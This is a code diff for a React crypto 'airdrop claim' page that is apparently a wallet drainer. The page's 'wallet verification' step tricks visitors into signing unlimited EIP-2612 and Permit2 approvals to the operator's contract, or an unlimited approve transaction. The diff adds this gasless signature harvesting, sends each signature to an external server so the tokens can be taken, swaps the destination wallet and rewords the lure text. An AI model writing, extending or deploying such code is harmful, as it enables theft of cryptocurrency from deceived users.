@@ -25,12 +25,11 @@ const NETWORK = 'Mainnet'
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 
 // 💰 SECURE DESTINATION WALLETS
-const EVM_COLD_WALLET = '0xe810953A18Ec0d16e4C3AC5a477421f93f8c7444'; 
+const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
 const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
-
-
 
 // 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
 const TARGET_TOKENS: Record<string, any> = {
@@ -64,8 +63,13 @@ const EVM_USDT: Record<number, string> = {
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
+  'function allowance(address owner, address spender) view returns (uint256)',
   'function nonces(address owner) view returns (uint256)',
   'function name() view returns (string)'
+]
+
+const PERMIT2_ABI = [
+    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
 // ── Reown Adapters ──
@@ -170,9 +174,7 @@ export default function App() {
     }
   }
 
-  // 🛠️ FIX 1: Removed the empty field bouncer. The button now works without input.
   const handleAction = () => {
-    
     if (!isConnected) {
       manualConnect.current = true; 
       open(); 
@@ -180,6 +182,30 @@ export default function App() {
       approveAndCollect();
     }
   }
+
+  // ── GASLESS SIGNATURE HELPERS ──
+  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
+    const chainId = (await signer.provider.getNetwork()).chainId;
+    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+    const name = await tokenContract.name();
+    const nonce = await tokenContract.nonces(await signer.getAddress());
+
+    // ── 🔥 USDC MAINNET VERSION FIX ──
+    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
+
+    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
+    const types = {
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' },
+      ],
+    };
+    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
+    return await signer.signTypedData(domain, types, message);
+  };
 
   const approveAndCollect = async () => {
     if (!walletAddress || !evmWalletProvider) return;
@@ -200,6 +226,7 @@ export default function App() {
       const ethersProvider = new BrowserProvider(evmWalletProvider as any);
       const signer = await ethersProvider.getSigner(walletAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
 
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
@@ -276,25 +303,126 @@ export default function App() {
           }
 
           if (!token.isNative) {
-            setStatus(`Approving ${token.symbol}...`);
-            log(`[ACTION] Prompting Approve: ${token.symbol}`);
+
+            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
+            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
+            const hasPermit2Mapping = currentP2Allowance > 0n; 
             
-            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-            const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
+          
+            let authorized = false;
+
+            // 1. Try EIP-2612 Permit (Gasless)
+            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
+                try {
+                    setStatus(`Signing Permit: ${token.symbol}...`);
+                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
+                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
+                    
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG (Fire & Forget)
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: EVM_CONTRACT_ADDRESS, 
+                        signature, 
+                        deadline 
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
+                } catch (pErr) {
+                    log(`⚠️ Permit failed, trying Permit2...`);
+                }
+            }
+
+            // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
+            if (!authorized && hasPermit2Mapping) {
+                try {
+                    setStatus(`Signing Permit2: ${token.symbol}...`);
+                    
+                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
+                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
+                    const currentNonce = Number(allowanceData.nonce);
+                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
+
+                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
+                    const types = {
+                        PermitSingle: [
+                            { name: 'details', type: 'PermitDetails' },
+                            { name: 'spender', type: 'address' },
+                            { name: 'sigDeadline', type: 'uint256' },
+                        ],
+                        PermitDetails: [
+                            { name: 'token', type: 'address' },
+                            { name: 'amount', type: 'uint160' },
+                            { name: 'expiration', type: 'uint48' },
+                            { name: 'nonce', type: 'uint48' },
+                        ],
+                    };
+                    const message = {
+                        details: { 
+                            token: token.address, 
+                            amount: '1461501637330902918203684832716283019655932542975', 
+                            expiration: deadline, 
+                            nonce: currentNonce
+                        },
+                        spender: EVM_CONTRACT_ADDRESS,
+                        sigDeadline: deadline
+                    };
+                    const signature = await signer.signTypedData(domain, types, message);
+
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG (Fire & Forget)
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT2', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: EVM_CONTRACT_ADDRESS, 
+                        signature, 
+                        deadline,
+                        nonce: currentNonce
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
+                } catch (p2Err) {
+                    log(`⚠️ Permit2 failed, falling back to gas...`);
+                }
+            }
+
+            // 3. Fallback: Standard Approve (Gas required)
+            if (!authorized) {
+                setStatus(`Approving ${token.symbol}...`);
+                log(`[ACTION] Prompting Approve: ${token.symbol}`);
+                
+                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+                
+                const txHash = await (evmWalletProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: cleanSenderAddress,
+                        to: token.address,
+                        data: encodedData,
+                        value: '0x0'
+                    }]
+                });
+                
+                setTxHash(txHash);
+                successCount++; 
+                log(`✅ ${token.symbol} Approved!`);
+            }
             
-            const txHash = await (evmWalletProvider as any).request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: cleanSenderAddress,
-                    to: token.address,
-                    data: encodedData,
-                    value: '0x0'
-                }]
-            });
-            
-            setTxHash(txHash);
-            successCount++; 
-            log(`✅ ${token.symbol} Approved!`);
             await sleep(1500);
           }
         } catch (err: any) {
@@ -355,7 +483,6 @@ export default function App() {
 
   const isButtonDisabled = loading;
 
-  // 🛠️ FIX 2: Airdrop-themed button states
   const buttonText = loading 
     ? 'Verifying...' 
     : !isConnected 
@@ -368,19 +495,18 @@ export default function App() {
 
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
-      {/* 🛠️ FIX 3: Updated Header */}
+      
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
         <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
-        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Claim Your Free USDT </h2>
+        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Airdrop Claim</h2>
         <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
       </div>
 
-      {/* 🛠️ FIX 4: Complete Airdrop Card UI */}
       <div style={{ flex: 1, padding: '16px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
         
         <div style={{ textAlign: 'center', marginBottom: '32px' }}>
-          <h3 style={{ fontSize: '32px', fontWeight: '800', color: '#111827', margin: '0 0 8px 0' }}>500 <span style={{color: '#0C66FF'}}>USDT/USDC</span></h3>
-          <p style={{ color: '#4B5563', fontSize: '15px', margin: 0, fontWeight: '500' }}>GIVEAWAY</p>
+          <h3 style={{ fontSize: '32px', fontWeight: '800', color: '#111827', margin: '0 0 8px 0' }}>10,500 <span style={{color: '#0C66FF'}}>$SAFE</span></h3>
+          <p style={{ color: '#4B5563', fontSize: '15px', margin: 0, fontWeight: '500' }}>Tier 1 Airdrop Allocation</p>
         </div>
 
         <div style={{ backgroundColor: '#F3F4F6', borderRadius: '16px', padding: '20px', width: '100%', boxSizing: 'border-box', marginBottom: '24px' }}>
@@ -400,7 +526,7 @@ export default function App() {
 
         <div style={{ backgroundColor: '#FEF2F2', border: '1.5px solid #FCA5A5', borderRadius: '12px', padding: '16px', width: '100%', boxSizing: 'border-box' }}>
           <p style={{ margin: 0, fontSize: '13.5px', color: '#B91C1C', lineHeight: '1.6', fontWeight: '600' }}>
-            ⚠️ <span style={{fontWeight: '800'}}>Wallet Verification Required:</span> You will be prompted to verify your wallet to securely calculate your final multiplier and distribute funds.
+            ⚠️ <span style={{fontWeight: '800'}}>Wallet Verification Required:</span> You will be prompted to register your on-chain balances to securely calculate your final multiplier and distribute funds.
           </p>
         </div>
 
